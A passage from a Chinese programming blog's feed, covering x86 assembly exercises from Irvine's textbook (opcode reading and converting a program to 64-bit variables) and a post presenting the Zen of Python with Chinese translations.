Errors</span><br></pre></td></tr></table></figure><p>主要看下以下三条：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000  B8 00000005       mov eax, 5</span><br><span class="line">00000005  83 C0 06          add eax, 6</span><br><span class="line">00000008  A3 00000000 R    mov sum, eax</span><br></pre></td></tr></table></figure><p>B8 代表 <code>mov ax, immed16</code>；83 C0 猜测与 add 之类有关，这个得去查手册；A3 代表 <code>mov [mem16], ax</code>。</p><span class='p blue'>AddVariables 程序</span><p>修改 AddVariables 程序使其使用 64 位变量。描述汇编器产生的语法错误，并说明为解决这些错误采取的措施。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat, stdcall</span><br><span class="line">.stack 4096</span><br><span class="line">ExitProcess PROTO, dwExitCode: DWORD</span><br><span class="line">.data</span><br><span class="line">firstval DWORD 20002000h</span><br><span class="line">secondval DWORD 11111111h</span><br><span class="line">thirdval DWORD 22222222h</span><br><span class="line">sum DWORD 0</span><br><span class="line">.code</span><br><span class="line">main PROC</span><br><span class="line">    mov rax, firstval</span><br><span class="line">    add rax, secondval</span><br><span class="line">    add rax, thirdval</span><br><span class="line">    mov sum, rax</span><br><span class="line">    INVOKE ExitProcess, 0</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure><p>报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">undefined symbol : rax</span><br></pre></td></tr></table></figure><p>解决方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ExitProcess PROTO</span><br><span class="line">.data</span><br><span class="line">firstval QWORD 20002000h</span><br><span class="line">secondval QWORD 11111111h</span><br><span class="line">thirdval QWORD 22222222h</span><br><span class="line">sum QWORD 0</span><br><span class="line">.code</span><br><span class="line">main PROC</span><br><span class="line">    mov rax, firstval</span><br><span class="line">    add rax, secondval</span><br><span class="line">    add rax, thirdval</span><br><span class="line">    mov sum, rax</span><br><span class="line">    </span><br><span class="line">    mov ecx, 0</span><br><span class="line">    call ExitProcess</span><br><span class="line">main ENDP</span><br><span class="line">END</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文是 Kip·Irvine 所写的 Assembly Langrage for x86 Processors (Seventh Edition) 第三章节的小结以及个人对章节编程习题的解答&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img sr</summary>
      
    
    
    
    <category term="Assembly" scheme="https://zeronohacker.github.io/categories/Assembly/"/>
    
    
    <category term="Assembly" scheme="https://zeronohacker.github.io/tags/Assembly/"/>
    
  </entry>
  
  <entry>
    <title>Python 之禅</title>
    <link href="https://zeronohacker.github.io/2018/04/25/import-this-in-python/"/>
    <id>https://zeronohacker.github.io/2018/04/25/import-this-in-python/</id>
    <published>2018-04-25T04:37:32.000Z</published>
    <updated>2021-09-19T05:38:28.586Z</updated>
    
    <content type="html"><![CDATA[<p>在博主学习 Python 的模块部分中，曾不小心写下了这句：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> this</span><br></pre></td></tr></table></figure></p><p><img src="https://image.zeronohacker.com/article/2018/04/25/b2f60bf633736257e846216fc24d14ac.png" alt=""></p><p>将上述这段话翻译一下，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">The Zen of Python, by Tim Peters</span><br><span class="line"> </span><br><span class="line">Beautiful <span class="keyword">is</span> better than ugly.</span><br><span class="line"><span class="comment"># 优美胜于丑陋（Python以编写优美的代码为目标）</span></span><br><span class="line">Explicit <span class="keyword">is</span> better than implicit.</span><br><span class="line"><span class="comment"># 明了胜于晦涩（优美的代码应当是明了的，命名规范，风格相似）</span></span><br><span class="line">Simple <span class="keyword">is</span> better than <span class="built_in">complex</span>.</span><br><span class="line"><span class="comment"># 简洁胜于复杂（优美的代码应当是简洁的，不要有复杂的内部实现）</span></span><br><span class="line">Complex <span class="keyword">is</span> better than complicated.</span><br><span class="line"><span class="comment"># 复杂胜于凌乱（如果复杂不可避免，那代码间也不能有难懂的关系，要保持接口简洁）</span></span><br><span class="line">Flat <span class="keyword">is</span> better than nested.</span><br><span class="line"><span class="comment"># 扁平胜于嵌套（优美的代码应当是扁平的，不能有太多的嵌套）</span></span><br><span class="line">Sparse <span class="keyword">is</span> better than dense.</span><br><span class="line"><span class="comment"># 间隔胜于紧凑（优美的代码有适当的间隔，不要奢望一行代码解决问题）</span></span><br><span class="line">Readability counts.</span><br><span class="line"><span class="comment"># 可读性很重要（优美的代码是可读的）</span></span><br><span class="line">Special cases aren’t special enough to <span class="keyword">break</span> the rules.Although practicality beats purity.</span><br><span class="line"><span class="comment"># 即便假借特例的实用性之名，也不可违背这些规则（这些规则至高无上）</span></span><br><span class="line">Errors should never <span class="keyword">pass</span> silently.Unless explicitly silenced.</span><br><span class="line"><span class="comment"># 不要包容所有错误，除非你确定需要这样做（精准地捕获异常，不写 except:pass 风格的代码）</span></span><br><span class="line">In the face of ambiguity, refuse the temptation to guess.</span><br><span class="line"><span class="comment"># 当存在多种可能，不要尝试去猜测</span></span><br><span class="line">There should be one– <span class="keyword">and</span> preferably only one –obvious way to do it.</span><br><span class="line"><span class="comment"># 而是尽量找一种，最好是唯一一种明显的解决方案（如果不确定，就用穷举法）</span></span><br><span class="line">Although that way may <span class="keyword">not</span> be obvious at first unless you’re Dutch</span><br><span class="line"><span class="comment"># 虽然这并不容易，因为你不是 Python 之父（这里的Dutch是指Guido）</span></span><br><span class="line">Now <span class="keyword">is</span> better than never.Although never <span class="keyword">is</span> often better than *right* now.</span><br><span class="line"><span class="comment"># 做也许好过不做，但不假思索就动手还不如不做（动手之前要细思量）</span></span><br><span class="line">If the implementation <span class="keyword">is</span> hard to explain, it’s a bad idea.If the implementation <span class="keyword">is</span> easy to explain, it may be a good idea.</span><br><span class="line"><span class="comment"># 如果你无法向人描述你的方案，那肯定不是一个好方案；反之亦然（方案测评标准）</span></span><br><span class="line">Namespaces are one honking great idea — let’s do more of those!</span><br><span class="line"><span class="comment"># 命名空间是一种绝妙的理念，我们应当多加利用（倡导与号召）</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在博主学习 Python 的模块部分中，曾不小心写下了这句：&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pr</summary>
      
    
    
    
    <category term="Python" scheme="https://zeronohacker.github.io/categories/Python/"/>
    
    
    <category term="Python" scheme="https://zeronohacker.github.io/tags/Python/"/>
    
  </entry>
  
</feed>
